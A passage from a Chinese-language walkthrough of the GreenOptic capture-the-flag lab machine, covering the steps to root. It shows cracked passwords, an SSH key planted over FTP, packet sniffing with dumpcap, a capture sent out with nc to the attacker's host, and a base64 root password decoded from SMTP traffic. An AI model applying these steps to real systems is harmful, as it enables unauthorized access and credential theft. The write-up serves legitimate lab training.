Use the "--show" option to display all of the cracked passwords reliably
Session completed
┌──(root💀kali)-[/usr/share/wordlists]
└─# john --show /tmp/htpasswd                                
staff:wheeler
1 password hash cracked, 0 left
```
使用`staff/wheeler`登录。
![]()
使用terry进行登录。
![]()
找到一则消息，下载`dpi`压缩包。
![]()
使用sam邮件的密码进行解压。
![]()
使用wireshark打开数据包，右键follow TCP stream，找到第25个数据包，是FTP用户登录，`alex/FwejAASD1`。（FTP是明文传输）
![]()
使用FTP账号进行登录。
```
┌──(root💀kali)-[~/Downloads]
└─# ftp 192.168.32.139
Connected to 192.168.32.139.
220 (vsFTPd 3.0.2)
Name (192.168.32.139:root): alex
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/home/alex"
ftp> 
```
知道当前目录是`/home/alex`，这样可以上传公钥，用证书登录。
生成公钥和私钥。
```
┌──(root💀kali)-[/tmp]
└─# ssh-keygen          
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /tmp/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/id_rsa
Your public key has been saved in /tmp/id_rsa.pub
The key fingerprint is:
SHA256:Q0ht+VhJfqKtOcYclyVknabBEPTte9FKbk3QeRXxHlk root@kali
The key's randomart image is:
+---[RSA 3072]----+
|      .o+*+o . oE|
|     . .+==.+  .*|
|      ...+=++ .++|
|       ..ooB   +o|
|        S + . o +|
|       o *   + = |
|        B   . = .|
|       . .   o   |
|                 |
+----[SHA256]-----+
```
上传公钥到FTP服务器
```
ftp> 
ftp> mkdir .ssh
257 "/home/alex/.ssh" created
ftp> cd .ssh
250 Directory successfully changed.
ftp> put /tmp/id_rsa.pub
local: /tmp/id_rsa.pub remote: /tmp/id_rsa.pub
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
563 bytes sent in 0.00 secs (9.1003 MB/s)
```
使用证书进行登录
```
┌──(root💀kali)-[/tmp]
└─# ssh -i id_rsa PI:EMAIL 
[alex@websrv01 ~]$ whoami
alex
[alex@websrv01 ~]$ id
uid=1002(alex) gid=1002(alex) groups=1002(alex),994(wireshark)
```
请注意，`id`这`alex`是wireshark组的一部分？让我们看看那个组可以在这个盒子上运行什么。
```
[alex@websrv01 opt]$ find / -type f -group wireshark 2>/dev/null
/usr/sbin/dumpcap
```
dumpcap命令是wireshark命令行捕捉数据包，猜测靶机自动传输一些敏感信息，抓取所有网卡接口的流量。
```
[alex@websrv01 tmp]$ dumpcap -i any
Capturing on 'any'
File: /tmp/wireshark_pcapng_any_20211227090725_V7WCH2
Packets captured: 394
Packets received/dropped on interface 'any': 394/0 (pcap:0/dumpcap:0/flushed:0) (100.0%)
```
本地部署http服务器，让靶场下载nc命令。
![]()
使用nc命令传输数据。
```
#靶机
[alex@websrv01 tmp]$ chmod +x nc
[alex@websrv01 tmp]$ ./nc -w 3 192.168.32.130 8000  wireshark.pcap
listening on [any] 8000 ...
connect to [192.168.32.130] from (UNKNOWN) [192.168.32.139] 42498
```
先排除SSH协议数据包
```
!(ip.addr==192.168.32.130)
```
找到一个SMTP的数据包，里面有一段base64加密的字符串
![]()
解密字符串，得到root密码
```
┌──(root💀kali)-[~/Downloads]
└─# echo AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28= | base64 -d
rootASfojoj2eozxczzmedlmedASASDKoj3o                                                                                                                     
```
最后获取root用户成功。
```
[alex@websrv01 tmp]$ su -
Password: 
Last failed login: Mon Dec 27 09:29:09 GMT 2021 on pts/0
There were 2 failed login attempts since the last successful login.
[root@websrv01 ~]# 
[root@websrv01 ~]# ls
anaconda-ks.cfg  root.txt
[root@websrv01 ~]# cat root.txt 
Congratulations on getting root!
  ____                      ___        _   _      
 / ___|_ __ ___  ___ _ __  / _ \ _ __ | |_(_) ___ 
| |  _| '__/ _ \/ _ \ '_ \| | | | '_ \| __| |/ __|
| |_| | | |  __/  __/ | | | |_| | |_) | |_| | (__ 
 \____|_|  \___|\___|_| |_|\___/| .__/ \__|_|\___|
                                |_|             
You've overcome a series of difficult challenges, so well done!
I'm happy to make my CTFs available for free. If you enjoyed doing the CTF, please leave a comment on my blog at https://security.caerdydd.wales - I will be happy for your feedback so I can improve them and make them more enjoyable in the future.
*********
Kindly place your vote on the poll located here to let me know how difficult you found it: https://security.caerdydd.wales/greenoptic-ctf/
*********
Thanks,
bootlesshacker
```